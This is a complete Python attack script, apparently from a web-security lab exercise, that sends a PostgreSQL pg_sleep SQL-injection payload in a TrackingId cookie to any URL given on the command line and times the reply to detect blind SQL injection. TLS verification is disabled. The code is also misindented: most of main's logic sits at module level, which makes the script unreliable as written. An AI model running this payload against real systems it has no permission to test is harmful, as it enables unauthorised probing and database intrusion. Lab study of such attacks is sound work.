#!/usr/bin/env python3

import requests
import sys
import time
import urllib3
from urllib.parse import quote
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {"https": "http://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}

def sqli_check(s, url, tracking_id, session_cookie, delay=10):
    payload = f"' || (SELECT pg_sleep({delay}))--"
    print(f"[*] Triggering {delay}s SQL sleep payload...")
    encoded_payload = quote(payload)
    cookies = {"TrackingId": tracking_id + encoded_payload, "session": session_cookie}
    start = time.monotonic()
    r = s.get(url, cookies=cookies, verify=False)
    elapsed = time.monotonic() - start
    return elapsed >= delay

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit()

url = sys.argv[1].strip()

tracking_id = "" # CHANGE ME
session_cookie = "" # CHANGE ME

s = requests.Session()

print("[*] Testing TrackingId for time-based SQL injection...")
vulnerable = sqli_check(s, url, tracking_id, session_cookie)
if vulnerable:
    print("[+] TrackingId appears vulnerable to time-based blind SQL injection")
else:
    print("[-] Target does not appear vulnerable")

if __name__=="__main__":
    main()